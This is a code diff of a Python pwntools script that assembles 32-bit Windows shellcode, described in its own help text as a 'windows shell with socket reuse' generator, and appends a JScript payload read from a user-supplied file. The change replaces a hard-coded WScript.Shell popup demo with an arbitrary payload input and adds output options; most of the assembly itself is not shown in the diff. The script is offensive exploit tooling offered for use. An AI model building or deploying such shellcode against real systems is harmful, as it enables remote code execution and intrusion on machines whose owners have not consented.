@@ -1,13 +1,16 @@
 #!/usr/bin/env python3
 from pwn import *
 import sys, re
+import argparse
+parser = argparse.ArgumentParser(description='Generate x86 windows shell with socket reuse shellcode')
+parser.add_argument('-o', '--output', type=argparse.FileType('wb'), required=False, help='Output shellcode file')
+parser.add_argument('-p', '--payload', type=str, required=True, help='Output shellcode file')
+args = parser.parse_args()
+payload = open(args.payload, 'r').read()
+payload = payload.encode('utf-16')[2:]+b'\x00'*16
+context.update(arch='i686', bits=32)
 
-js_payload = '''
-var shell = new ActiveXObject("WScript.Shell");
-shell.Popup("ActiveScripting was made to torture people");
-'''
 code = '''
-
 push ebp
 mov ebp, esp
 sub esp, 0x30
@@ -402,13 +405,11 @@ ret
 call .back
 '''
 
-
-js_payload = js_payload.encode('utf-16')[2:]+b'\x00'*16
-context.update(arch='i686', bits=32)
-# code = open(sys.argv[1], 'r').read()
 code = re.sub(';.*\n', '\n', code)
 sc = asm(code)
-sc +=js_payload
+sc +=payload
 
-open(sys.argv[1].strip('.asm')+'.bin', 'wb').write(sc)
-print("Done!")
+if args.output == None:
+	print(sc)
+else:
+	args.output.write(sc)
